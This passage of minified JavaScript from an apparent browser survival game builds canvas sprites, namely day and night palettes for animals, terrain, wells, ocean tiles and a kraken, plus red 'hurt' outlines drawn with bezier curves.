                    sprite[ze.DOOR_GOLD_OPEN_WINTER][ze.DAY] = c(Pt(1, !1, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"])),
                    sprite[ze.DOOR_GOLD_OPEN_WINTER][ze.NIGHT] = c(Pt(1, !1, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"])),
                    sprite[ze.FOX] = [],
                    sprite[ze.FOX][ze.DAY] = c(Si(.9, ["#1d051e", "#ffffff", "#c41c50", "#2c2e2d", "#c63450", "#f7e7f0"])),
                    sprite[ze.FOX][ze.NIGHT] = c(Si(.9, ["#123d38", "#1a847f", "#200333", "#131919", "#01333a", "#b6f2db"])),
                    sprite[ze.BEAR] = [],
                    sprite[ze.BEAR][ze.DAY] = c(mi(.9, ["#1d051e", "#ffffff", "#c41c50", "#c63450", "#ffffff", "#f7e7f0", "#2b2d2d"])),
                    sprite[ze.BEAR][ze.NIGHT] = c(mi(.9, ["#123d38", "#1a847f", "#200333", "#01333a", "#ffffff", "#b6f2db", "#2b2d2d"])),
                    sprite[ze.MINIMAP] = [],
                    sprite[ze.MINIMAP_CTX] = [],
                    sprite[ze.BIGMAP] = [],
                    sprite[ze.BIGMAP_CTX] = [],
                    t = 0; t < 2; t++)
                    sprite[ze.MINIMAP][t] = document.createElement("canvas"),
                        sprite[ze.MINIMAP][t].width = 193,
                        sprite[ze.MINIMAP][t].height = 193,
                        sprite[ze.MINIMAP_CTX][t] = sprite[ze.MINIMAP][t].getContext("2d"),
                        sprite[ze.BIGMAP][t] = document.createElement("canvas"),
                        sprite[ze.BIGMAP][t].width = 600,
                        sprite[ze.BIGMAP][t].height = 600,
                        sprite[ze.BIGMAP_CTX][t] = sprite[ze.BIGMAP][t].getContext("2d");
                for (sprite[ze.SNOW_STEP] = [],
                    sprite[ze.SNOW_STEP][ze.DAY] = c(Ni(1, ["#c8e0de"])),
                    sprite[ze.SNOW_STEP][ze.NIGHT] = c(Ni(1, ["#147071"])),
                    sprite[ze.LAVA_STEP] = [],
                    sprite[ze.LAVA_STEP][ze.DAY] = c(Ni(1, ["#231912"])),
                    sprite[ze.LAVA_STEP][ze.NIGHT] = c(Ni(1, ["#021719"])),
                    sprite[ze.HURT_TREASURE_CHEST] = c((s = .5,
                        T = ["#BB0000"],
                        E = document.createElement("canvas"),
                        r = E.getContext("2d"),
                        E.width = 253 * s,
                        E.height = 192 * s,
                        r.save(),
                        r.translate(37 * s, 94 * s),
                        Ve(r, -7 * s, -20 * s, 14 * s, 37 * s, 20 * s),
                        r.restore(),
                        he(r, T[0]),
                        r.save(),
                        r.translate(131 * s, 94 * s),
                        Ve(r, -84 * s, -67 * s, 168 * s, 134 * s, 20 * s),
                        r.restore(),
                        he(r, T[0], T[0], 13 * s),
                        r.save(),
                        r.translate(223 * s, 94.5 * s),
                        Ve(r, -5 * s, -18.5 * s, 10 * s, 37 * s, 20 * s),
                        r.restore(),
                        he(r, T[0]),
                        r.save(),
                        r.translate(128.5 * s, 170.5 * s),
                        Ve(r, -22.5 * s, -6.5 * s, 45 * s, 13 * s, 20 * s),
                        r.restore(),
                        he(r, T[0]),
                        E)),
                    sprite[ze.HURT_FOX] = c((o = .9,
                        a = "#BB0000",
                        d = document.createElement("canvas"),
                        n = d.getContext("2d"),
                        d.width = 161 * o,
                        d.height = 190 * o,
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(9 * o, 93 * o),
                        n.bezierCurveTo(17 * o, 95 * o, 19 * o, 95 * o, 21 * o, 95 * o),
                        n.bezierCurveTo(9 * o, 83 * o, 17 * o, 93 * o, 4 * o, 76 * o),
                        n.bezierCurveTo(11 * o, 75 * o, 11 * o, 75 * o, 18 * o, 75 * o),
                        n.bezierCurveTo(13 * o, 67 * o, 13 * o, 67 * o, 7 * o, 59 * o),
                        n.bezierCurveTo(14 * o, 59 * o, 14 * o, 59 * o, 21 * o, 59 * o),
                        n.bezierCurveTo(46 * o, 35 * o, 35 * o, 45 * o, 49 * o, 31 * o),
                        n.bezierCurveTo(53 * o, 24 * o, 51 * o, 21 * o, 51 * o, 16 * o),
                        n.bezierCurveTo(63 * o, 23 * o, 63 * o, 24 * o, 69 * o, 29 * o),
                        n.bezierCurveTo(76 * o, 7 * o, 75 * o, 11 * o, 76 * o, 6 * o),
                        n.bezierCurveTo(81 * o, 12 * o, 84 * o, 18 * o, 89 * o, 27 * o),
                        n.bezierCurveTo(95 * o, 25 * o, 100 * o, 16 * o, 105 * o, 14 * o),
                        n.bezierCurveTo(103 * o, 25 * o, 111 * o, 33 * o, 110 * o, 34 * o),
                        n.bezierCurveTo(123 * o, 48 * o, 123 * o, 48 * o, 136 * o, 62 * o),
                        n.bezierCurveTo(142 * o, 60 * o, 147 * o, 59 * o, 155 * o, 58 * o),
                        n.bezierCurveTo(147 * o, 65 * o, 147 * o, 65 * o, 139 * o, 73 * o),
                        n.bezierCurveTo(145 * o, 73 * o, 145 * o, 73 * o, 151 * o, 73 * o),
                        n.bezierCurveTo(145 * o, 80 * o, 145 * o, 80 * o, 138 * o, 87 * o),
                        n.bezierCurveTo(144 * o, 88 * o, 144 * o, 88 * o, 150 * o, 89 * o),
                        n.bezierCurveTo(125 * o, 103 * o, 125 * o, 125 * o, 113 * o, 141 * o),
                        n.bezierCurveTo(92 * o, 178 * o, 85 * o, 177 * o, 76 * o, 178 * o),
                        n.bezierCurveTo(64 * o, 179 * o, 51 * o, 164 * o, 35 * o, 131 * o),
                        n.bezierCurveTo(18 * o, 95 * o, 13 * o, 99 * o, 8 * o, 93 * o),
                        n.closePath(),
                        he(n, a, a, 4 * o),
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(25 * o, 63 * o),
                        n.bezierCurveTo(16 * o, 58 * o, 17 * o, 51 * o, 17 * o, 33 * o),
                        n.bezierCurveTo(19 * o, 12 * o, 21 * o, 12 * o, 32 * o, 17 * o),
                        n.bezierCurveTo(63 * o, 31 * o, 66 * o, 45 * o, 66 * o, 54 * o),
                        he(n, a, a, 4 * o),
                        n.beginPath(),
                        n.lineCap = "round",
                        n.lineJoin = "round",
                        n.moveTo(91 * o, 53 * o),
                        n.bezierCurveTo(91 * o, 40 * o, 98 * o, 33 * o, 121 * o, 20 * o),
                        n.bezierCurveTo(137 * o, 12 * o, 137 * o, 16 * o, 139 * o, 27 * o),
                        n.bezierCurveTo(141 * o, 49 * o, 140 * o, 57 * o, 134 * o, 64 * o),
                        he(n, a, a, 4 * o),
                        d)),
                    sprite[ze.HURT_BEAR] = c((s = .9,
                        r = "#BB0000",
                        T = document.createElement("canvas"),
                        E = T.getContext("2d"),
                        T.width = 147 * s,
                        T.height = 172 * s,
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(8 * s, 50 * s),
                        E.bezierCurveTo(15 * s, 16 * s, 49 * s, 6 * s, 67 * s, 6 * s),
                        E.bezierCurveTo(121 * s, 3 * s, 128 * s, 32 * s, 135 * s, 48 * s),
                        E.bezierCurveTo(146 * s, 96 * s, 124 * s, 131 * s, 96 * s, 135 * s),
                        E.bezierCurveTo(96 * s, 158 * s, 79 * s, 156 * s, 75 * s, 156 * s),
                        E.bezierCurveTo(50 * s, 154 * s, 53 * s, 150 * s, 52 * s, 135 * s),
                        E.bezierCurveTo(2 * s, 127 * s, 3 * s, 87 * s, 8 * s, 50 * s),
                        E.closePath(),
                        he(E, r, r, 4 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(14 * s, 57 * s),
                        E.bezierCurveTo(2 * s, 50 * s, 5 * s, 22 * s, 24 * s, 22 * s),
                        E.bezierCurveTo(41 * s, 21 * s, 54 * s, 32 * s, 55 * s, 48 * s),
                        he(E, r, r, 4 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(93 * s, 47 * s),
                        E.bezierCurveTo(94 * s, 24 * s, 116 * s, 21 * s, 120 * s, 20 * s),
                        E.bezierCurveTo(144 * s, 17 * s, 146 * s, 52 * s, 133 * s, 58 * s),
                        he(E, r, r, 4 * s),
                        T)),
                    sprite[ze.HURT_DRAGON] = c((n = 1,
                        a = ["#BB0000"],
                        o = document.createElement("canvas"),
                        d = o.getContext("2d"),
                        o.width = 271 * n,
                        o.height = 366 * n,
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(133 * n, 99 * n),
                        d.bezierCurveTo(186 * n, 123 * n, 199 * n, 152 * n, 209 * n, 169 * n),
                        d.bezierCurveTo(228 * n, 205 * n, 224 * n, 245 * n, 190 * n, 276 * n),
                        d.bezierCurveTo(161 * n, 296 * n, 99 * n, 292 * n, 79 * n, 274 * n),
                        d.bezierCurveTo(49 * n, 253 * n, 47 * n, 214 * n, 50 * n, 197 * n),
                        d.bezierCurveTo(61 * n, 143 * n, 102 * n, 113 * n, 131 * n, 99 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(73 * n, 270 * n),
                        d.bezierCurveTo(79 * n, 280 * n, 77 * n, 280 * n, 78 * n, 287 * n),
                        d.bezierCurveTo(78 * n, 290 * n, 83 * n, 291 * n, 82 * n, 299 * n),
                        d.bezierCurveTo(81 * n, 301 * n, 87 * n, 301 * n, 92 * n, 314 * n),
                        d.bezierCurveTo(94 * n, 319 * n, 100 * n, 321 * n, 107 * n, 320 * n),
                        d.bezierCurveTo(111 * n, 323 * n, 114 * n, 324 * n, 119 * n, 320 * n),
                        d.bezierCurveTo(137 * n, 321 * n, 146 * n, 323 * n, 139 * n, 320 * n),
                        d.bezierCurveTo(141 * n, 324 * n, 150 * n, 324 * n, 153 * n, 320 * n),
                        d.bezierCurveTo(168 * n, 319 * n, 171 * n, 316 * n, 173 * n, 307 * n),
                        d.bezierCurveTo(180 * n, 305 * n, 180 * n, 301 * n, 178 * n, 296 * n),
                        d.bezierCurveTo(183 * n, 296 * n, 185 * n, 289 * n, 188 * n, 279 * n),
                        d.bezierCurveTo(171 * n, 286 * n, 149 * n, 290 * n, 132 * n, 289 * n),
                        d.bezierCurveTo(101 * n, 290 * n, 86 * n, 280 * n, 74 * n, 271 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(76 * n, 252 * n),
                        d.bezierCurveTo(85 * n, 294 * n, 96 * n, 314 * n, 103 * n, 314 * n),
                        d.bezierCurveTo(106 * n, 316 * n, 151 * n, 314 * n, 156 * n, 314 * n),
                        d.bezierCurveTo(169 * n, 317 * n, 182 * n, 285 * n, 191 * n, 256 * n),
                        d.bezierCurveTo(134.5 * n, 254 * n, 134.5 * n, 254 * n, 78 * n, 252 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(84 * n, 257 * n),
                        d.bezierCurveTo(122 * n, 273 * n, 146 * n, 268 * n, 179 * n, 261 * n),
                        d.bezierCurveTo(190 * n, 258 * n, 187 * n, 266 * n, 178 * n, 272 * n),
                        d.bezierCurveTo(160 * n, 284 * n, 123 * n, 282 * n, 100 * n, 277 * n),
                        d.bezierCurveTo(73 * n, 260 * n, 79 * n, 257 * n, 84 * n, 257 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(125 * n, 65 * n),
                        d.bezierCurveTo(133 * n, 45 * n, 136 * n, 42 * n, 141 * n, 55 * n),
                        d.bezierCurveTo(151 * n, 96 * n, 164 * n, 117 * n, 175 * n, 134 * n),
                        d.bezierCurveTo(203 * n, 181 * n, 207 * n, 182 * n, 208 * n, 215 * n),
                        d.bezierCurveTo(206 * n, 240 * n, 205 * n, 246 * n, 184 * n, 258 * n),
                        d.bezierCurveTo(161 * n, 267 * n, 131 * n, 272 * n, 86 * n, 258 * n),
                        d.bezierCurveTo(67 * n, 252 * n, 68 * n, 239 * n, 64 * n, 216 * n),
                        d.bezierCurveTo(62 * n, 194 * n, 72 * n, 169 * n, 92 * n, 142 * n),
                        d.bezierCurveTo(106 * n, 121 * n, 114 * n, 101 * n, 125 * n, 65 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(115 * n, 37 * n),
                        d.bezierCurveTo(116 * n, 28 * n, 119 * n, 27 * n, 126 * n, 37 * n),
                        d.bezierCurveTo(134 * n, 48 * n, 134 * n, 49 * n, 132 * n, 59 * n),
                        d.bezierCurveTo(131 * n, 67 * n, 127 * n, 65 * n, 120 * n, 56 * n),
                        d.bezierCurveTo(114 * n, 49 * n, 113 * n, 43 * n, 115 * n, 38 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(146 * n, 34 * n),
                        d.bezierCurveTo(152 * n, 28 * n, 155 * n, 27 * n, 157 * n, 39 * n),
                        d.bezierCurveTo(157 * n, 45 * n, 157 * n, 49 * n, 150 * n, 56 * n),
                        d.bezierCurveTo(141 * n, 66 * n, 138 * n, 66 * n, 138 * n, 57 * n),
                        d.bezierCurveTo(137 * n, 50 * n, 137 * n, 47 * n, 141 * n, 42 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(143 * n, 69 * n),
                        d.bezierCurveTo(148 * n, 56 * n, 156 * n, 50 * n, 158 * n, 58 * n),
                        d.bezierCurveTo(159 * n, 64 * n, 160 * n, 67 * n, 153 * n, 77 * n),
                        d.bezierCurveTo(148 * n, 83 * n, 145 * n, 84 * n, 143 * n, 77 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(149 * n, 92 * n),
                        d.bezierCurveTo(149 * n, 89 * n, 151 * n, 84 * n, 156 * n, 79 * n),
                        d.bezierCurveTo(161 * n, 73 * n, 163 * n, 78 * n, 162 * n, 86 * n),
                        d.bezierCurveTo(161 * n, 91 * n, 155 * n, 99 * n, 152 * n, 98 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(111 * n, 61 * n),
                        d.bezierCurveTo(114 * n, 51 * n, 117 * n, 51 * n, 124 * n, 64 * n),
                        d.bezierCurveTo(128 * n, 68 * n, 128 * n, 76 * n, 126 * n, 79 * n),
                        d.bezierCurveTo(123 * n, 84 * n, 122 * n, 82 * n, 115 * n, 74 * n),
                        d.bezierCurveTo(112 * n, 67 * n, 115 * n, 74 * n, 115 * n, 74 * n),
                        d.bezierCurveTo(111 * n, 68 * n, 111 * n, 66 * n, 111 * n, 62 * n),
                        d.closePath(),
                        he(d, a[0]),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(107 * n, 81 * n),
                        d.bezierCurveTo(108 * n, 74 * n, 112 * n, 73 * n, 118 * n, 84 * n),
                        d.bezierCurveTo(122 * n, 88 * n, 122 * n, 93 * n, 121 * n, 98 * n),
                        d.bezierCurveTo(114 * n, 98 * n, 113 * n, 98 * n, 109 * n, 90 * n),
                        d.bezierCurveTo(107 * n, 87 * n, 106 * n, 85 * n, 107 * n, 82 * n),
                        d.closePath(),
                        he(d, a[0]),
                        o)),
                    sprite[ze.HURT_WING_LEFT] = c((E = .8,
                        r = "#BB0000",
                        s = document.createElement("canvas"),
                        T = s.getContext("2d"),
                        s.width = 85 * E,
                        s.height = 145 * E,
                        T.translate(-20 * E, -95 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(50 * E, 105 * E),
                        T.bezierCurveTo(52 * E, 119 * E, 64 * E, 137 * E, 71 * E, 146 * E),
                        T.bezierCurveTo(71 * E, 161 * E, 74 * E, 169 * E, 79 * E, 179 * E),
                        T.bezierCurveTo(68 * E, 192 * E, 70 * E, 204 * E, 69 * E, 216 * E),
                        T.bezierCurveTo(50 * E, 189.5 * E, 50 * E, 189.5 * E, 31 * E, 163 * E),
                        T.closePath(),
                        he(T, r),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(44 * E, 106 * E),
                        T.bezierCurveTo(49 * E, 90 * E, 58 * E, 104 * E, 51 * E, 121 * E),
                        T.bezierCurveTo(45 * E, 143 * E, 41 * E, 151 * E, 37 * E, 162 * E),
                        T.bezierCurveTo(48 * E, 180 * E, 58 * E, 188 * E, 76 * E, 205 * E),
                        T.bezierCurveTo(104 * E, 209 * E, 105 * E, 229 * E, 92 * E, 235 * E),
                        T.bezierCurveTo(76 * E, 239 * E, 75 * E, 232 * E, 56 * E, 213 * E),
                        T.bezierCurveTo(31 * E, 187 * E, 28 * E, 176 * E, 23 * E, 162 * E),
                        T.bezierCurveTo(38 * E, 131 * E, 40 * E, 120 * E, 44 * E, 106 * E),
                        T.closePath(),
                        he(T, r, r, 4 * E),
                        T.beginPath(),
                        T.lineCap = "round",
                        T.lineJoin = "round",
                        T.moveTo(30 * E, 159 * E),
                        T.bezierCurveTo(46 * E, 157 * E, 59 * E, 152 * E, 68 * E, 148 * E),
                        T.bezierCurveTo(63 * E, 155 * E, 52 * E, 160 * E, 44 * E, 164 * E),
                        T.bezierCurveTo(59 * E, 169 * E, 66 * E, 174 * E, 75 * E, 178 * E),
                        T.bezierCurveTo(58 * E, 178 * E, 49 * E, 175 * E, 37 * E, 174 * E),
                        T.closePath(),
                        he(T, r),
                        s)),
                    sprite[ze.HURT_WING_RIGHT] = c((n = .8,
                        d = "#BB0000",
                        a = document.createElement("canvas"),
                        o = a.getContext("2d"),
                        a.width = 85 * n,
                        a.height = 145 * n,
                        o.translate(-165 * n, -95 * n),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(217 * n, 103 * n),
                        o.bezierCurveTo(209 * n, 129 * n, 203 * n, 137 * n, 195 * n, 146 * n),
                        o.bezierCurveTo(195 * n, 159 * n, 194 * n, 167 * n, 189 * n, 178 * n),
                        o.bezierCurveTo(193 * n, 186 * n, 196 * n, 195 * n, 198 * n, 216 * n),
                        o.bezierCurveTo(217.5 * n, 189.5 * n, 217.5 * n, 189.5 * n, 237 * n, 163 * n),
                        o.closePath(),
                        he(o, d),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(231 * n, 163 * n),
                        o.bezierCurveTo(221 * n, 139 * n, 218 * n, 128 * n, 215 * n, 114 * n),
                        o.bezierCurveTo(213 * n, 102 * n, 220 * n, 92 * n, 222 * n, 107 * n),
                        o.bezierCurveTo(224 * n, 118 * n, 233 * n, 138 * n, 244 * n, 161 * n),
                        o.bezierCurveTo(235 * n, 188 * n, 224 * n, 198 * n, 204 * n, 221 * n),
                        o.bezierCurveTo(190 * n, 233 * n, 190 * n, 235 * n, 180 * n, 235 * n),
                        o.bezierCurveTo(167 * n, 235 * n, 164 * n, 216 * n, 175 * n, 211 * n),
                        o.bezierCurveTo(176 * n, 208 * n, 181 * n, 207 * n, 191 * n, 205 * n),
                        o.bezierCurveTo(213 * n, 186 * n, 218 * n, 180 * n, 230 * n, 163 * n),
                        o.closePath(),
                        he(o, d, d, 4 * n),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(234 * n, 154 * n),
                        o.bezierCurveTo(227 * n, 156 * n, 222 * n, 156 * n, 199 * n, 148 * n),
                        o.bezierCurveTo(201 * n, 151 * n, 216 * n, 159 * n, 224 * n, 162 * n),
                        o.bezierCurveTo(209 * n, 169.5 * n, 209 * n, 169.5 * n, 194 * n, 177 * n),
                        o.bezierCurveTo(213.5 * n, 175 * n, 213.5 * n, 175 * n, 233 * n, 173 * n),
                        o.closePath(),
                        he(o, d),
                        a)),
                    sprite[ze.HURT_RABBIT] = c((E = .9,
                        T = "#BB0000",
                        r = document.createElement("canvas"),
                        s = r.getContext("2d"),
                        n = 115 * E,
                        o = 4 * E,
                        r.width = 85 * E,
                        r.height = n,
                        s.translate(-130 * E, -60 * E),
                        s.globalAlpha = 1,
                        s.beginPath(),
                        s.bezierCurveTo(190 * E, 87 * E, 201 * E, 59 * E, 208 * E, 64 * E),
                        s.bezierCurveTo(213 * E, 68 * E, 204 * E, 93 * E, 195 * E, 109 * E),
                        s.bezierCurveTo(195 * E, 109 * E, 202 * E, 124 * E, 191 * E, 141 * E),
                        s.bezierCurveTo(182 * E, 151 * E, 164 * E, 155 * E, 148 * E, 144 * E),
                        s.bezierCurveTo(136 * E, 135 * E, 138 * E, 111 * E, 145 * E, 104 * E),
                        s.bezierCurveTo(140 * E, 92 * E, 131 * E, 67 * E, 138 * E, 63 * E),
                        s.bezierCurveTo(145 * E, 61 * E, 153 * E, 82 * E, 155 * E, 96 * E),
                        s.bezierCurveTo(167 * E, 91 * E, 178 * E, 92 * E, 187 * E, 98 * E),
                        s.closePath(),
                        he(s, T, T, o),
                        r)),
                    sprite[ze.HURT] = c(i1(.6, "#BB0000")),
                    sprite[ze.COLD] = c(i1(.6, "#1CE7E0")),
                    sprite[ze.HUNGER] = c(i1(.6, "#DBE71C")),
                    sprite[ze.HEAL] = c(i1(.6, "#00BB00")),
                    sprite[ze.SAND_STEP] = [],
                    sprite[ze.SAND_STEP][ze.DAY] = c(Ni(1, ["#dac291"])),
                    sprite[ze.SAND_STEP][ze.NIGHT] = c(Ni(1, ["#0D423D"])),
                    sprite[ze.ISLAND_STEP] = [],
                    sprite[ze.ISLAND_STEP][ze.DAY] = c(Ni(1, ["#dac291"])),
                    sprite[ze.ISLAND_STEP][ze.NIGHT] = c(Ni(1, ["#0D423D"])),
                    sprite[ze.WELL_FULL] = [],
                    sprite[ze.WELL_FULL][ze.DAY] = c(s0(.3, !0, ["#1e2021", "#717273", "#606162", "#a09f9f", "#878787", "#1a6470"])),
                    sprite[ze.WELL_FULL][ze.NIGHT] = c(s0(.3, !0, ["#1e2021", "#1a4545", "#163a3a", "#245d5d", "#1f5454", "#09373F"])),
                    sprite[ze.WELL_EMPTY] = [],
                    sprite[ze.WELL_EMPTY][ze.DAY] = c(s0(.3, !0, ["#1e2021", "#717273", "#606162", "#a09f9f", "#878787", "#454545"])),
                    sprite[ze.WELL_EMPTY][ze.NIGHT] = c(s0(.3, !0, ["#1e2021", "#1a4545", "#163a3a", "#245d5d", "#1f5454", "#0b2121"])),
                    sprite[ze.BOTTLE_FULL] = [c(v0(1, 0, ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]))],
                    sprite[ze.BOTTLE_EMPTY] = [c(v0(1, 0, ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]))],
                    sprite[ze.OCEAN] = [],
                    sprite[ze.OCEAN][ze.DAY] = [],
                    sprite[ze.OCEAN][ze.NIGHT] = [],
                    sprite[ze.OCEAN][ze.DAY].push(c(ci(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.DAY].push(c(Oi(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.DAY].push(c(gi(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.DAY].push(c(pi(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.DAY].push(c(Ri(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.DAY].push(c(Ci(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.DAY].push(c(bi(1, ["#0B6A84"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(ci(1, ["#09373F"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(Oi(1, ["#09373F"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(gi(1, ["#09373F"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(pi(1, ["#09373F"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(Ri(1, ["#09373F"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(Ci(1, ["#09373F"]))),
                    sprite[ze.OCEAN][ze.NIGHT].push(c(bi(1, ["#09373F"]))),
                    sprite[ze.ISLAND] = [],
                    sprite[ze.ISLAND][ze.DAY] = [],
                    sprite[ze.ISLAND][ze.NIGHT] = [],
                    sprite[ze.ISLAND][ze.DAY].push(c(si(1.7, ["#FBEFBC"], 0))),
                    sprite[ze.ISLAND][ze.DAY].push(c(si(1.9, ["#FBEFBC"], 1))),
                    sprite[ze.ISLAND][ze.DAY].push(c(si(1.7, ["#FBEFBC"], 2))),
                    sprite[ze.ISLAND][ze.NIGHT].push(c(si(1.7, ["#0F4C48"], 0))),
                    sprite[ze.ISLAND][ze.NIGHT].push(c(si(1.9, ["#0F4C48"], 1))),
                    sprite[ze.ISLAND][ze.NIGHT].push(c(si(1.7, ["#0F4C48"], 2))),
                    sprite[ze.WAVE_ONE] = [],
                    sprite[ze.WAVE_ONE][ze.DAY] = [],
                    sprite[ze.WAVE_ONE][ze.NIGHT] = [],
                    sprite[ze.WAVE_ONE][ze.DAY].push(c(si(1.8, ["#A9D6D3"], 0))),
                    sprite[ze.WAVE_ONE][ze.DAY].push(c(si(2, ["#A9D6D3"], 1))),
                    sprite[ze.WAVE_ONE][ze.DAY].push(c(si(1.8, ["#A9D6D3"], 2))),
                    sprite[ze.WAVE_ONE][ze.NIGHT].push(c(si(1.8, ["#115E60"], 0))),
                    sprite[ze.WAVE_ONE][ze.NIGHT].push(c(si(2, ["#115E60"], 1))),
                    sprite[ze.WAVE_ONE][ze.NIGHT].push(c(si(1.8, ["#115E60"], 2))),
                    sprite[ze.WAVE_TWO] = [],
                    sprite[ze.WAVE_TWO][ze.DAY] = [],
                    sprite[ze.WAVE_TWO][ze.NIGHT] = [],
                    sprite[ze.WAVE_TWO][ze.DAY].push(c(si(1.9, ["#2A8B9B"], 0))),
                    sprite[ze.WAVE_TWO][ze.DAY].push(c(si(2.1, ["#2A8B9B"], 1))),
                    sprite[ze.WAVE_TWO][ze.DAY].push(c(si(1.9, ["#2A8B9B"], 2))),
                    sprite[ze.WAVE_TWO][ze.NIGHT].push(c(si(1.9, ["#0F464C"], 0))),
                    sprite[ze.WAVE_TWO][ze.NIGHT].push(c(si(2.1, ["#0F464C"], 1))),
                    sprite[ze.WAVE_TWO][ze.NIGHT].push(c(si(1.9, ["#0F464C"], 2))),
                    sprite[ze.PALM] = [],
                    sprite[ze.PALM][ze.DAY] = [],
                    sprite[ze.PALM][ze.NIGHT] = [],
                    sprite[ze.PALM][ze.DAY].push(c(Mt(.8, ["#231F20", "#0c8e5b", "#037542", "#077b49"]))),
                    sprite[ze.PALM][ze.DAY].push(c(Mt(1, ["#231F20", "#0c8e5b", "#037542", "#077b49"]))),
                    sprite[ze.PALM][ze.DAY].push(c(Mt(1.2, ["#231F20", "#0c8e5b", "#037542", "#077b49"]))),
                    sprite[ze.PALM][ze.NIGHT].push(c(Mt(.8, ["#041e22", "#124949", "#0e3838", "#0a4049"]))),
                    sprite[ze.PALM][ze.NIGHT].push(c(Mt(1, ["#041e22", "#124949", "#0e3838", "#0a4049"]))),
                    sprite[ze.PALM][ze.NIGHT].push(c(Mt(1.2, ["#041e22", "#124949", "#0e3838", "#0a4049"]))),
                    sprite[ze.KRAKEN] = [],
                    sprite[ze.KRAKEN][ze.DAY] = c(t0(.8, ["#1e2021", "#B6222A", "#201851", "#342C7C", "#F4F4F4", "#D3D3D3", "#6765CE", "#593CC6", "#433BAD", "#342C7C", "#052830", "#EAEAEA", "#B6222A", "#FFFFFF"])),
                    sprite[ze.KRAKEN][ze.NIGHT] = c(t0(.8, ["#0c0c0d", "#462966", "#081B2D", "#342C7C", "#9AAAAD", "#72898C", "#133556", "#296D9B", "#25557C", "#133556", "#0D2A42", "#EAEAEA", "#462966", "#72898C"])),
                    sprite[ze.HURT_KRAKEN] = c((d = .8,
                        a = ["#B6222A"],
                        n = document.createElement("canvas"),
                        E = n.getContext("2d"),
                        n.width = 376 * d,
                        n.height = 371 * d,
                        E.globalAlpha = 1,
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(191.633544921875 * d, 123.98580932617188 * d),
                        E.bezierCurveTo(215.633544921875 * d, 85.98580932617188 * d, 187.633544921875 * d, 71.98580932617188 * d, 202.633544921875 * d, 19.985809326171875 * d),
                        E.bezierCurveTo(231.633544921875 * d, 68.98580932617188 * d, 253.633544921875 * d, 71.98580932617188 * d, 256.633544921875 * d, 93.98580932617188 * d),
                        E.bezierCurveTo(306.633544921875 * d, 64.98580932617188 * d, 319.633544921875 * d, 61.985809326171875 * d, 350.633544921875 * d, 58.985809326171875 * d),
                        E.bezierCurveTo(280.633544921875 * d, 86.98580932617188 * d, 281.633544921875 * d, 106.98580932617188 * d, 268.633544921875 * d, 130.98580932617188 * d),
                        E.bezierCurveTo(295.633544921875 * d, 158.98580932617188 * d, 328.633544921875 * d, 155.98580932617188 * d, 353.633544921875 * d, 90.98580932617188 * d),
                        E.bezierCurveTo(371.633544921875 * d, 158.98580932617188 * d, 337.633544921875 * d, 210.98580932617188 * d, 286.633544921875 * d, 209.98580932617188 * d),
                        E.bezierCurveTo(323.633544921875 * d, 230.98580932617188 * d, 317.633544921875 * d, 274.9858093261719 * d, 356.633544921875 * d, 305.9858093261719 * d),
